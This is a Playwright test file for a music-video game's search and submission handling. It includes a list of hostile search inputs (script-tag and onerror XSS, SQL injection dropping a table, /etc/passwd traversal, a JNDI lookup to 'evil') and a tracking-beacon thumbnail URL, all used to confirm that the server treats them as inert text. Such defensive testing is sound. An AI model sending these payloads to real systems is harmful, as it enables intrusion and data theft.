import { test, expect } from '@playwright/test'
import { io } from 'socket.io-client'
import { testRunId } from './helpers.js'

// What the search box accepts, and what a submission is trusted to say.
//
// The input is deliberately unfiltered: song titles carry punctuation, accents,
// emoji and non-Latin scripts, so a character blocklist would break real
// searches while adding nothing. Safety comes from encoding at each boundary —
// the query is percent-encoded into the API URL, titles are rendered as text,
// and the only value that becomes part of a URL is the 11-character video id.
// These tests hold that line from the outside.

const API_URL = 'http://localhost:5000'

function connect(id, name) {
  const socket = io(API_URL, {
    transports: ['websocket'], forceNew: true, reconnection: false,
    auth: { testUser: { userId: id, name, avatar: '🎵' } }
  })
  const ready = new Promise((resolve, reject) => {
    socket.once('session', resolve)
    socket.once('connect_error', reject)
  })
  return { id, socket, ready }
}

function waitFor(socket, event, match = () => true, timeoutMs = 10_000) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      socket.off(event, handler)
      reject(new Error(`no matching ${event} within ${timeoutMs}ms`))
    }, timeoutMs)
    function handler(payload) {
      if (!match(payload)) return
      clearTimeout(timer)
      socket.off(event, handler)
      resolve(payload)
    }
    socket.on(event, handler)
  })
}

/** Sends one search and returns the server's reply, whatever it is. */
async function search(player, query) {
  const reply = waitFor(player.socket, 'youtube_results')
  player.socket.emit('search_youtube', { query })
  return reply
}

test.describe('the search box', () => {
  test('finds videos whatever the case or spacing', async () => {
    const player = connect(`vsa-case-${testRunId()}`, 'Case Player')
    await player.ready

    // The bug this guards: the client compared the echoed query against a
    // lowercased copy, so anything with a capital letter was thrown away.
    const queries = [
      'queen',            // all lowercase
      'QUEEN',            // all uppercase
      'QuEeN',            // mixed
      'bohemian rhapsody', // spaces
      'BOHEMIAN RHAPSODY',
      '  queen  ',        // padded — the server trims
      'bohemian    rhapsody' // collapsed internally, not rejected
    ]

    for (const query of queries) {
      const { query: echoed, results } = await search(player, query)
      expect(Array.isArray(results), `results for ${JSON.stringify(query)}`).toBe(true)
      expect(results.length, `results for ${JSON.stringify(query)}`).toBeGreaterThan(0)
      // Echoed trimmed but otherwise untouched: the client normalises both
      // sides rather than assuming the server lowercases.
      expect(echoed).toBe(query.trim())
      await new Promise((r) => setTimeout(r, 250)) // stay under the rate limit
    }
    player.socket.close()
  })

  test('takes hostile input as text, and keeps working afterwards', async () => {
    const player = connect(`vsa-inject-${testRunId()}`, 'Inject Player')
    await player.ready

    const hostile = [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "'; DROP TABLE groups; --",
      "1' OR '1'='1",
      '../../etc/passwd',
      '%3Cscript%3E',
      '\u0000\u0007 control chars',
      '&key=stolen&maxResults=50', // would be extra API params if concatenated
      '${jndi:ldap://evil/x}',
      '🎵🎶 emoji and ünïcödé'
    ]

    for (const query of hostile) {
      const { results } = await search(player, query)
      // Handled as a search term: an array comes back and nothing is executed,
      // stored or interpolated anywhere as a result of sending it.
      expect(Array.isArray(results), `results for ${JSON.stringify(query)}`).toBe(true)
      for (const video of results) {
        // Whatever comes back is still a well-formed video: the id is the only
        // field that ever reaches a URL, so it must always be exactly an id.
        expect(video.videoId).toMatch(/^[A-Za-z0-9_-]{11}$/)
        expect(String(video.thumbnail)).toMatch(/^https:\/\//)
      }
      await new Promise((r) => setTimeout(r, 250))
    }

    // The server is still healthy and answering after all of that.
    const { results } = await search(player, 'queen')
    expect(results.length).toBeGreaterThan(0)
    player.socket.close()
  })

  test('an over-long query is refused rather than truncated', async () => {
    const player = connect(`vsa-long-${testRunId()}`, 'Long Player')
    await player.ready

    // 300 is the limit; a query past it is rejected outright, which the server
    // reports as an empty result for an empty query.
    const { query: echoed, results } = await search(player, 'q'.repeat(301))
    expect(echoed).toBe('')
    expect(results).toEqual([])

    // And the connection survives it.
    const after = await search(player, 'queen')
    expect(after.results.length).toBeGreaterThan(0)
    player.socket.close()
  })
})

test.describe('what a submission is trusted to say', () => {
  test('the thumbnail is derived from the video id, never taken from the client', async () => {
    const runId = testRunId()
    const host = connect(`vsa-host-${runId}`, 'Sub Host')
    const guest = connect(`vsa-guest-${runId}`, 'Sub Guest')
    await Promise.all([host.ready, guest.ready])

    const created = new Promise((resolve) => host.socket.once('group_created', resolve))
    host.socket.emit('create_group', { groupData: { name: `Thumb ${runId}`, settings: {} } })
    const { group } = await created

    const joined = new Promise((resolve) => guest.socket.once('group_joined', resolve))
    guest.socket.emit('join_group', { inviteCode: group.inviteCode })
    await joined

    host.socket.emit('start_group', { groupId: group.id })
    await waitFor(host.socket, 'group_updated', (u) => u.group?.id === group.id && u.group?.status === 'active')

    // Whoever is Judge picks; the other one submits.
    const [judge, submitter] = await (async () => {
      const state = await new Promise((resolve) => {
        host.socket.emit('get_group', { groupId: group.id })
        host.socket.once('group_details', resolve)
      })
      return state.isRoundLeader ? [host, guest] : [guest, host]
    })()

    const topicCreated = new Promise((resolve) => judge.socket.once('topic_submitted', resolve))
    judge.socket.emit('submit_topic', { text: `Thumb topic ${runId}`, isPublic: false })
    const { topic } = await topicCreated
    judge.socket.emit('select_topic', { groupId: group.id, topicId: topic.id })
    await waitFor(submitter.socket, 'group_updated',
      (u) => u.group?.id === group.id && u.group?.currentTheme?.status === 'submission')

    // A hostile thumbnail: it passes a naive "starts with https://" check, and
    // every other player's browser would fetch it — handing a third party their
    // IP addresses, user agents and timing.
    const voting = waitFor(submitter.socket, 'group_updated',
      (u) => u.group?.id === group.id && u.group?.currentTheme?.status === 'voting')
    submitter.socket.emit('submit_video', {
      groupId: group.id,
      videoId: 'dQw4w9WgXcQ',
      title: 'A perfectly normal song',
      channelTitle: 'A channel',
      thumbnail: 'https://tracker.example/beacon.png?who=victim'
    })
    const { group: withVotes } = await voting

    const [submission] = withVotes.currentTheme.submissions
    expect(submission.thumbnail).toBe('https://i.ytimg.com/vi/dQw4w9WgXcQ/mqdefault.jpg')
    expect(submission.thumbnail).not.toContain('tracker.example')

    host.socket.close()
    guest.socket.close()
  })
})
